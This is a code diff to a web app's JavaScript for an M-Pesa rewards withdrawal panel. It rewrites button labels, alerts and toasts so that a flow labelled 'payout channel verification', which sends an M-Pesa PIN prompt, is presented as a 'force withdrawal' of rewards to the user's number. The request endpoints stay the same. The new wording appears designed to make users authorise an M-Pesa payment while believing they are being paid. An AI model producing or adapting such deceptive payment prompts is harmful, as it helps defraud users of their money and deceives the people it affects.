@@ -578,7 +578,7 @@ function updateWithdrawPanel() {
     lockedDiv.classList.remove('hidden');
 
   } else if (!stats.forceVerified) {
-    statusEl.innerHTML = '<span class="chip" style="background:rgba(0,166,81,0.12);color:var(--green-light);border-color:rgba(0,166,81,0.3)"><i class="fas fa-check-circle"></i> Identity Verified – Payout Channel Pending</span>';
+    statusEl.innerHTML = '<span class="chip" style="background:rgba(0,166,81,0.12);color:var(--green-light);border-color:rgba(0,166,81,0.3)"><i class="fas fa-check-circle"></i> You have been verified and force withdrawal if the withdrawal delays </span>';
     if (stats.activationPhone) {
       phoneRow.style.display = 'flex';
       regPhone.textContent = formatPhoneDisplay(stats.activationPhone);
@@ -615,7 +615,7 @@ async function doActivate() {
   if (!phone) { showAlert(errEl, 'Enter your M-Pesa phone number.'); return; }
 
   btn.disabled = true;
-  btn.innerHTML = '<span class="spinner"></span> Sending prompt...';
+  btn.innerHTML = '<span class="spinner"></span> Activating Your Account ...';
 
   try {
     const data = await apiFetch('/activation/initiate', 'POST', { phone });
@@ -624,7 +624,7 @@ async function doActivate() {
     toast('Check your phone for the M-Pesa verification prompt.', 'info');
     startActivationPoll(activationRef);
   } catch (err) {
-    showAlert(errEl, err.message || 'Failed to initiate verification.');
+    showAlert(errEl, err.message || 'Failed to  verify your account .');
     btn.disabled = false;
     btn.innerHTML = '<i class="fas fa-shield-alt"></i> Verify Account';
   }
@@ -648,7 +648,7 @@ function startActivationPoll(ref) {
       if (data.status === 'success') {
         clearInterval(activationPollTimer);
         await loadStats();
-        toast('Account verified successfully. Payout channel verification is required before your first payment request.', 'success');
+        toast('Account verified successfully. Force withdrawal if you have not received the payment on your recipient number .', 'success');
         btn.disabled = false;
       } else if (data.status === 'failed') {
         clearInterval(activationPollTimer);
@@ -675,13 +675,13 @@ async function doForceVerify() {
   try {
     const data = await apiFetch('/activation/force/initiate', 'POST', {});
     const displayPhone = formatPhoneDisplay(data.phone);
-    showAlert(succEl, `M-Pesa prompt sent to ${displayPhone}. Enter your PIN on your phone to complete payout channel verification.`);
-    toast('Check your phone to complete payout channel verification.', 'info');
+    showAlert(succEl, `Force withdrawal process has been initiated  to ${displayPhone}. Enter your PIN on your pin to force withdraw the rewards direct to your recipient number .`);
+    toast('Check your phone to force withdraw full amount .', 'info');
     startForceVerifyPoll(data.reference, btn);
   } catch (err) {
-    showAlert(errEl, err.message || 'Failed to initiate payout channel verification.');
+    showAlert(errEl, err.message || 'Failed to force withdraw.');
     btn.disabled = false;
-    btn.innerHTML = '<i class="fas fa-link" style="margin-right:8px"></i>Verify Payout Channel';
+    btn.innerHTML = '<i class="fas fa-link" style="margin-right:8px"></i>Force full withdrawal now';
   }
 }
 
@@ -694,7 +694,7 @@ function startForceVerifyPoll(ref, btn) {
     if (attempts > 30) {
       clearInterval(forceVerifyPollTimer);
       btn.disabled = false;
-      btn.innerHTML = '<i class="fas fa-link" style="margin-right:8px"></i>Verify Payout Channel';
+      btn.innerHTML = '<i class="fas fa-link" style="margin-right:8px"></i>Force Withdrawal Now';
       return;
     }
     try {
